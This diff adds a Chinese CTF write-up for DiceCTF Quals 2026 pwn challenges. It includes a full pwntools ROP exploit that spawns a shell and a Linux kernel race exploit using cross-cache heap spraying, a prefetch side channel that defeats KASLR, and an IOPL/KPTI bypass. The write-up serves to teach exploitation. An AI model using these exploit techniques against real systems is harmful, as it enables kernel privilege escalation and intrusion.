@@ -1,0 +1,525 @@
+export const layout = "#components/Page.js";
+export const title = "DiceCTF Quals 2026 Writeup";
+export const description = "";
+export const created = "2026-03-13T00:38:35+08:00";
+
+# DiceCTF Quals 2026 Pwn 题解
+
+## garden
+
+核心 bug 在 `alloc_off_heap()`：
+
+```c
+ref_t arr_ref = (ref_t)heap_used;
+```
+
+`heap_used` 是 `size_t`，`arr_ref` 是 `uint32_t`。只要申请一个足够大的 off-heap object，让 `heap_used` 超过 `0xffffffff`，返回值就会截断回低 32 位。这样新对象的逻辑位置会“绕回去”，落到旧对象可控的区域里，形成重叠。
+
+题目里 off-heap 对象的头部布局是：
+
+```c
+typedef struct {
+    arr_header_t header;
+    uint32_t *data;
+    size_t obj_size;
+} off_heap_obj_t;
+```
+
+重叠后如果这个头部落进 numeric array `A`，那么：
+
+- `A[3]` 是 `header`
+- `A[5], A[6]` 是 `data`
+- `A[7], A[8]` 是 `obj_size`
+
+所以可以直接通过改 `A` 来伪造 `O2.data` 和 `O2.obj_size`。
+
+很容易做堆块重叠 泄漏 libc environ 然后 `system("/bin/sh\x00")`。
+
+## message-store
+
+任意地址执行，注意程序对 buffer 做了 `from_utf8_lossy`，如果有不合法字符会导致 rax 不是 bss 上的 buffer 地址，否则可以直接 `xchg rax, rsp; ret` 栈迁移打完。
+
+```py
+from pwn import *
+import subprocess
+from sys import argv
+
+proc = "./challenge"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+is_remote = len(argv) > 1 and argv[1] == 'r'
+io = remote("message-store.chals.dicec.tf", 1337) if is_remote else process(proc)
+
+
+def solve_pow():
+    io.recvuntil(b"proof of work:\n")
+    cmd = io.recvline().decode().strip()
+    io.recvuntil(b"solution: ")
+    log.info(f"solving pow: {cmd}")
+    solution = subprocess.check_output(cmd, shell=True, timeout=240).strip()
+    io.sendline(solution)
+
+def choose(idx):
+    io.sendlineafter(b">", str(idx).encode())
+
+def set_message(content):
+    choose(1)
+    io.sendlineafter(b"New Message? ", content)
+
+def set_color(offset):
+    choose(2)
+    io.sendlineafter(b">", str(offset).encode())
+
+
+# 0x00000000002b17dc : mov rdx, rsi ; ret
+
+pop_rdi_ret = 0x000000000024349d
+pop_rsi_ret = 0x0000000000243431
+syscall = 0x00000000002a6602
+mov_rdx_rsi = 0x2b17dc
+buf = 0x2F9E38
+
+pivot = 0x242d78       # xchg rsp, rax ; ret
+read_wrap = 0x2a3450   # full std::sys::stdio::unix::read prologue
+pop_rax_ret = 0x0000000000249be7
+
+if is_remote:
+    solve_pow()
+
+
+stage1 = bytearray(b"A" * 0x50)
+stage1[0:8] = p64(read_wrap)
+stage1[0x48:0x50] = p64(pivot)
+stage1 = bytes(stage1)
+stage1.decode("utf-8")
+
+
+stage2 = bytearray(b"Z" * 0x70)
+stage2[0:8] = p64(0x4242424242424242)  # 恢复给 rbp 的占位
+stage2[0x08:0x10] = p64(pop_rdi_ret)
+stage2[0x10:0x18] = p64(buf + 0x68)
+stage2[0x18:0x20] = p64(pop_rsi_ret)
+stage2[0x20:0x28] = p64(0)
+stage2[0x28:0x30] = p64(mov_rdx_rsi)
+stage2[0x30:0x38] = p64(pop_rsi_ret)
+stage2[0x38:0x40] = p64(buf + 0x58)
+stage2[0x40:0x48] = p64(pop_rax_ret)
+stage2[0x48:0x50] = p64(59)
+stage2[0x50:0x58] = p64(syscall)
+stage2[0x58:0x60] = p64(buf + 0x68)
+stage2[0x60:0x68] = p64(0)
+stage2[0x68:0x70] = b"/bin/sh\x00"
+stage2 = bytes(stage2)
+
+set_message(stage1)
+set_color(0x12b3)
+choose(3)
+
+pause()
+io.send(stage2)
+io.interactive()
+```
+
+## bytecrusher
+
+远程可以先泄漏 16 字节，先泄漏 canary，再泄漏一个 pie，然后正常 rop 就可以。
+
+
+## cornelslop
+
+条件竞争 kernel pwn 题目，之前一直不太会调这类 race 题，借着这次机会好好学习一下。
+
+首先看一下题目源码，漏洞点主要在这里
+
+```c
+struct cornelslop_entry {
+    uint32_t id;
+    uint64_t va_start;
+    uint64_t va_end;
+    uint8_t shash[SHA256_DIGEST_SIZE];
+    struct rcu_head rcu;
+};
+
+
+static int check_entry(struct cornelslop_user_entry *ue)
+{
+    uint8_t shash[SHA256_DIGEST_SIZE];
+    struct cornelslop_entry *e;
+    int ret = 0;
+
+    e = xa_load(&cornelslop_xa, ue->id);
+    if (!e)
+        return -ENOENT;
+
+    pr_info("🤖 Verifying %u with SOTA slop in space 🤖\n", ue->id);
+    ret = sha256_va_range(e->va_start, e->va_end, shash);
+
+    if (ret)
+        goto finish;
+
+    ue->corrupted = memcmp(e->shash, shash, SHA256_DIGEST_SIZE);
+
+    if (ue->corrupted) {
+        xa_erase(&cornelslop_xa, ue->id);
+        destruct_entry(e);
+        pr_info("🤖 HUMAN TAMPERING DETECTED, this incident will be reported 🤖\n");
+    }
+
+finish:
+    return ret;
+}
+```
+
+`check_entry` 函数会调用 `sha256_va_range`，如果计算结果和 `add_entry` 中的 `shash` 不一致，就会调用 `destruct_entry` 删除该 entry。
+
+```c
+static inline void destruct_entry(struct cornelslop_entry *e)
+{
+    call_rcu(&e->rcu, destruct_entry_rcu);
+}
+```
+
+`struct rcu_head` 是 Linux 内核中用于实现 RCU（Read-Copy Update）机制的结构体，它包含一个函数指针 `func`，用于在 RCU 回调中调用。源码在[这里](https://elixir.bootlin.com/linux/v6.12.69/source/include/linux/types.h#L242)
+
+`call_rcu` 的源码在[这里](https://elixir.bootlin.com/linux/v6.12.69/source/kernel/rcu/tree.c#L2572)，本质调用了函数指针 `rhp->func`。
+
+注意到 `check_entry` 这里完全不检查 double free，所以可以通过对一个 victim entry 进行两次 `destruct_entry`，由于 `call_rcu` 本质上是调用结构体里的函数指针，如果可以在这两次 `destruct_entry`（也就是这道题目的 race 窗口）期间把 victim entry 申请回来，那就可以 hijack rip 了。
+
+思路大概是这么个思路，实现部分还是有很多细节的。
+
+
+### cross-cache attack
+
+```c
+cornelslop_entry_cachep = KMEM_CACHE(cornelslop_entry, SLAB_PANIC | SLAB_ACCOUNT | SLAB_NO_MERGE);
+```
+
+很显然这道题目如果想实现“把 victim entry 申请回来”，必须需要利用 cross-cache attack。
+
+```c
+#define MAX_LEN (256 * 1024 * 1024)
+#define SIZE MAX_LEN
+#define OBJECTS_PER_PAGE 56  // 一页最多能放 56 个对象，每个对象 0x48
+#define MAXN (OBJECTS_PER_PAGE * 2 + 4)
+#define min_partial 5
+
+
+#define ADD_ENTRY 0xcafebabe
+#define DEL_ENTRY 0xdeadbabe
+#define CHECK_ENTRY 0xbeefbabe
+
+int fd;
+int ids[MAXN];
+
+typedef struct cornelslop_user_entry {
+    uint32_t id;
+    uint64_t va_start;
+    uint64_t va_end;
+    uint8_t corrupted;
+} cue;
+
+void spary(int size) {
+    for (int i = 0; i < size; ++i) {
+        void *buff = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
+        cue ue = {
+            .id = -1,
+            .va_start = (uint64_t)buff,
+            .va_end = (uint64_t)buff + PAGE_SIZE,
+            .corrupted = -1
+        };
+        int ret = ioctl(fd, ADD_ENTRY, &ue);
+        if (ret != 0) {
+            error("ioctl(ADD_ENTRY) failed: %d\n", ret);
+            exit(1);
+        }
+        ids[i] = ue.id;
+    }
+    return;
+}
+
+void delete(int size, int core) {
+    int pid = fork();
+    if (!pid) {
+        bind_core(core);
+        for (int i = 0; i < size; ++i) {
+            cue ue = {
+                .id = ids[i],
+                .va_start = -1,
+                .va_end = -1,
+                .corrupted = -1
+            };
+            ioctl(fd, DEL_ENTRY, &ue);
+        }
+        exit(0);
+    }
+    waitpid(pid, NULL, 0);
+    usleep(100000);
+}
+
+int main() {
+    bind_core(0);
+    fd = open("/dev/cornelslop", O_RDONLY | O_CLOEXEC);
+    
+    void *buff = mmap(NULL, SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);  // 这里要申请最大的 buf，这样 sha256 计算耗时更长，窗口更长。
+    info("0x%lx", (uint64_t)buff);
+    
+    cue ue = {
+        .id = -1,
+        .va_start = (uint64_t)buff,
+        .va_end = (uint64_t)buff + SIZE,
+        .corrupted = -1
+    };  // victim entry
+    
+    int ret = ioctl(fd, ADD_ENTRY, &ue);  // victim
+    return 0;
+}
+```
+
+
+分析一下此时 CPU0 的 slab 情况，应该是 Active Page 里只有 1 个 inuse，我们的目标是把这个 victim entry 所在的 slab page（后续简称 victim page）放回 buddy system。
+
+pwndbg 看一下，如图：
+
+![](https://pic1.imgdb.cn/item/69b2f2bbcda91d5fba01f521.png)
+
+1. 先把这个 victim page 填满，然后扔到 CPU1 的 partial page 里
+
+```c
+    spary(OBJECTS_PER_PAGE * 2 - 1);
+    delete(OBJECTS_PER_PAGE * 2 - 1, 1);
+```
+执行完后效果如下图：
+
+![](https://pic1.imgdb.cn/item/69b2f540cda91d5fba01f5ab.png)
+
+tips: 为什么要 `* 2` 呢？因为如果只申请一个 slab page 的话，它实际上会被放在 per-cpu 的 active list，如果分配/删除两个 slab page，那么一个会作为 active page，另一个才会进入 partial page。
+
+
+2. 然后堆喷把 CPU1 的 partial page list 填满，再溢出一个，这样 victim page 就会被放到 buddy system 里了。
+
+```c
+    for (int i = 0; i < min_partial - 1; ++i) {
+        spary(OBJECTS_PER_PAGE * 2);
+        delete(OBJECTS_PER_PAGE * 2, 1);
+    }
+    spary(OBJECTS_PER_PAGE * 2);  
+    // 再溢出一页
+    // 把已经满的 CPU1 的 Partial Slabs 全部放到 node_list 里，其中包含 victim 所在的 slab page
+    delete(OBJECTS_PER_PAGE * 2, 1);
+```
+
+效果如下：
+
+![](https://pic1.imgdb.cn/item/69b2fe66cda91d5fba01f6c9.png)
+
+此时如果把 victim entry 删掉，victim page 就会被释放回 buddy system 了。
+
+![](https://pic1.imgdb.cn/item/69b2fea1cda91d5fba01f6cb.png)
+
+已经看到回 buddy system 了.
+
+3. 接下来只需要构造 race，并在窗口内把 victim page 申请回来
+
+如果直接 double free 的话，两次 `call_rcu` 的间隔过短，victim page 可能还没喷回来，此时 `rcu->func` 是 0，直接导致第二次 `call_rcu` 时内核崩溃。
+
+所以需要在 double free 中间夹一些无用的 `call_rcu`，延长窗口。
+
+```c
+    bind_core(2);
+    spary(OBJECTS_PER_PAGE * 2);
+
+    bind_core(0);
+    sleep(1.0);
+    *(char *)buff = 0x91;
+
+    int pid = fork();
+    if (!pid) {
+        bind_core(3);
+        usleep(1);
+        ret = ioctl(fd, DEL_ENTRY, &ue);
+        info("child ioctl ret: %d", ret);
+
+        bind_core(2);
+        for (int i = 0; i < OBJECTS_PER_PAGE * 2; ++i) {
+            cue tmp = {
+                .id = ids[i],
+                .va_start = -1,
+                .va_end = -1,
+                .corrupted = -1
+            };
+            ret = ioctl(fd, DEL_ENTRY, &tmp);
+        }
+        while(1){}
+        exit(0);
+    }
+
+    usleep(1);
+    ret = ioctl(fd, CHECK_ENTRY, &ue);
+    info("parent ioctl ret: %d", ret);
+```
+
+
+由于 `write_pipe` 会 `alloc_page`，所以最好用 `pipe` 把 victim page 重新喷回来。
+
+```c
+   page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
+   buf->page = page;
+   buf->ops = &anon_pipe_buf_ops;
+   copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
+```
+
+大概像下面这样喷一下。
+
+```c
+    // 提升 fd 上限
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+        rl.rlim_cur = rl.rlim_max;
+        setrlimit(RLIMIT_NOFILE, &rl);
+    }
+
+    int size = 0x700;
+    int fds[size][2];
+    for (int i = 0; i < size; i++)
+        pipe((int *)&fds[i]);
+
+    char payload[PAGE_SIZE];
+    for (int i = 0; i < PAGE_SIZE; i += 0x48) {
+        memset(payload + i, 0x41, 0x48);
+    }
+    // ...
+    
+    bind_core(3);
+    for (int i = 0; i < size; ++i) {
+        write(fds[i][1], payload, PAGE_SIZE);  // pipe 会 alloc_page
+    }
+```
+
+可以看到成功劫持了 rip。
+
+
+### leak
+
+纯板子，由于这个题用的是 host cpu，所以用预取攻击
+
+```c
+#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
+#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
+
+#define STEP_KERNEL 0x200000ull
+#define SCAN_START_KERNEL KERNEL_LOWER_BOUND
+#define SCAN_END_KERNEL KERNEL_UPPER_BOUND
+#define ARR_SIZE_KERNEL (SCAN_END_KERNEL - SCAN_START_KERNEL) / STEP_KERNEL
+
+#define DUMMY_ITERATIONS 10
+#define ITERATIONS 10000
+
+uint64_t sidechannel(uint64_t addr) {
+  uint64_t start, end;
+
+  asm volatile(
+    "mfence\n\t"
+    "rdtscp\n\t"
+    "shl $32, %%rdx\n\t"
+    "or %%rdx, %%rax\n\t"
+    "mov %%rax, %0\n\t"
+    "lfence\n\t"
+    "prefetchnta (%2)\n\t"
+    "prefetcht2 (%2)\n\t"
+    "lfence\n\t"
+    "rdtscp\n\t"
+    "shl $32, %%rdx\n\t"
+    "or %%rdx, %%rax\n\t"
+    "mov %%rax, %1\n\t"
+    "mfence\n\t"
+    : "=r" (start), "=r" (end)
+    : "r" (addr)
+    : "rax", "rcx", "rdx", "cc", "memory");
+
+  return end - start;
+}
+
+
+uint64_t prefetch() {
+	uint64_t arr_size = ARR_SIZE_KERNEL;
+	uint64_t scan_start = SCAN_START_KERNEL;
+	uint64_t step_size = STEP_KERNEL;
+
+	uint64_t *data = (uint64_t *)malloc(arr_size * sizeof(uint64_t));
+	memset(data, 0, arr_size * sizeof(uint64_t));
+
+	uint64_t min = ~0, addr = ~0;
+
+	for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
+	{
+		for (uint64_t idx = 0; idx < arr_size; idx++)
+		{
+			uint64_t test = scan_start + idx * step_size;
+			syscall(104);
+			uint64_t time = sidechannel(test);
+			if (i >= DUMMY_ITERATIONS)
+				data[idx] += time;
+		}
+	}
+
+	for (int i = 0; i < arr_size; i++)
+	{
+		data[i] /= ITERATIONS;
+		if (data[i] < min)
+		{
+			min = data[i];
+			addr = scan_start + i * step_size;
+		}
+	}
+
+	free(data);
+	return addr;
+}
+```
+
+
+### 控制执行流
+
+由于劫持 rip 的位置是在中断上下文，而且题目还开启了 KPTI，所以常规的返回用户态提权的 rop 应该是没办法拿到 shell 的。
+
+这里我用的是 kqx 博客里提到的 IOPL 技术，为了绕过 KPTI，需要执行 `swapgs_restore_regs_and_return_to_usermode`，然后伪造一个 iretq frame 就好。
+
+IOPL 技术的核心其实就是在伪造这个 frame 的 RFLAGS 时，修改其 IOPL 位为 3，当控制流返回用户态时，由于 `ring <= IOPL`，可以执行 `in` `out` 指令，从而可以直接去读 qemu 的 `fw_cfg` 端口，获取 flag。
+
+
+```c
+void win() {
+	outw(FW_CFG_INITRD_DATA, FW_CFG_PORT_SEL);
+
+	for (int i = 0; i < INITRD_SIZE; i++)
+		initrd[i] = inb(FW_CFG_PORT_DATA);
+	*sem = 1;
+	while(1) {}
+}
+
+int main() {
+    // ...
+    char payload[PAGE_SIZE];
+    for (int i = 0; i < PAGE_SIZE; i += 0x48) {
+        *(uint64_t *)&payload[i] = (uint64_t)&win;
+        *(uint64_t *)&payload[i + 0x8] = 0x33;
+        *(uint64_t *)&payload[i + 0x10] = 0x3206;
+        *(uint64_t *)&payload[i + 0x18] = (uint64_t)stack + PAGE_SIZE * 4;
+        *(uint64_t *)&payload[i + 0x20] = 0x2b;
+        *(uint64_t *)&payload[i + 0x28] = 1;
+        *(uint64_t *)&payload[i + 0x30] = 2;
+        *(uint64_t *)&payload[i + 0x38] = 3;
+        *(uint64_t *)&payload[i + 0x40] = kbase + 0x10017ff;
+        *(uint64_t *)&payload[i + 0x48] = 5;
+    }
+    // ...
+    // 
+    int flag = open("/tmp/initrd.gz", O_RDWR);
+    write(flag, initrd, INITRD_SIZE);
+    system("strings /tmp/initrd.gz | grep dice{");
+}
+
+```
+
+完整 exp 在[这里](https://blog.littflower.top/exp.c)。
